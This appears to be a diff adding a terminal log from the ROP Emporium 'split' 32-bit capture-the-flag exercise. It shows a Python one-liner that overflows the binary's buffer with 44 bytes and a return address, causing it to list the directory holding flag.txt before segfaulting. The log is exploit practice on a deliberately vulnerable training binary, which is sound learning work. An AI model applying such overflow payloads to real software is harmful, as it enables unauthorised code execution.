@@ -1,0 +1,9 @@
+(base) ➜  split32 python2.7 -c "print 'A'*44+'I\x86\x04\x08'" | ./split32
+split by ROP Emporium
+32bits
+
+Contriving a reason to ask user for data...
+> core  flag.txt	in.bin	split32  try_hack_rop.py
+[1]    23325 done                              python2.7 -c "print 'A'*44+'I\x86\x04\x08'" |
+       23326 segmentation fault (core dumped)  ./split32
+       
